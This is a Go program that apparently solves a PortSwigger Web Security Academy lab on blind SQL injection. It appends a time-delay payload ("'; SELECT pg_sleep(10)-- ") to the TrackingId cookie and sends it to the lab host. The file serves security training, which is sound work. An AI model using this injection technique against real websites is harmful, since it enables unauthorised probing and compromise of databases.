// https://portswigger.net/web-security/sql-injection/blind/lab-time-delays

package main

import (
	"fmt"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"time"
)

func main() {
	err := solve()
	if err != nil {
		log.Fatalln(err)
	}
}

func solve() error {
	client, err := newClient()
	if err != nil {
		return err
	}

	u := "https://0ab5005104091886c035cb7100830026.web-security-academy.net"

	trackingIdCookie, err := trackingIdCookie(u, client)
	if err != nil {
		return err
	}

	return causeDelay(u, trackingIdCookie, client)
}

func trackingIdCookie(u string, client *http.Client) (*http.Cookie, error) {
	resp, err := client.Get(u)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode/100 != 2 {
		return nil, fmt.Errorf("Status: %v", resp.Status)
	}

	u2, err := url.Parse(u)
	if err != nil {
		return nil, err
	}

	cookies := client.Jar.Cookies(u2)
	for _, c := range cookies {
		fmt.Println(c)
		if c.Name == "TrackingId" {
			return c, nil
		}
	}

	return nil, fmt.Errorf("TrackingId cookie not found")
}

func causeDelay(u string, trackingIdCookie *http.Cookie, client *http.Client) error {
	u2, err := url.Parse(u)
	if err != nil {
		return err
	}

	var trCookie http.Cookie
	trCookie = *trackingIdCookie

	// clear
	trCookie.Value = ""
	trCookie.Expires = time.Unix(0, 0)
	client.Jar.SetCookies(u2, []*http.Cookie{&trCookie})

	trCookie.Value = trackingIdCookie.Value + "'%3B SELECT pg_sleep(10)-- "
	fmt.Println(trCookie.Value)

	req, err := http.NewRequest("GET", u, nil)
	if err != nil {
		return err
	}
	// to avoid adding double quotes around the value
	req.Header.Add("Cookie", trCookie.Name+"="+trCookie.Value)

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

func newClient() (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	//u2, _ := url.Parse("http://127.0.0.1:8888")

	return &http.Client{
		Jar: jar,
		//Transport: &http.Transport{Proxy: http.ProxyURL(u2)},
	}, nil
}
